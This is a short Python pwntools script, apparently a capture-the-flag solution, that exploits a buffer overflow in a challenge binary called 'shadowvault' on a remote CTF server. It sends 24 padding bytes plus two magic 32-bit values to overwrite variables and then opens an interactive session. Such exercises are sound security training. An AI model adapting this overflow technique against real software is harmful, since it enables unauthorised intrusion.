#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./shadowvault", checksec=False)

# p = process(exe.path)
p = remote("0.cloud.chals.io", 30551)

payload = b"A" * 24
payload += p32(0x0657ac1e)
payload += p32(0xdefec7ed)

p.sendlineafter("secret?", payload)

p.interactive()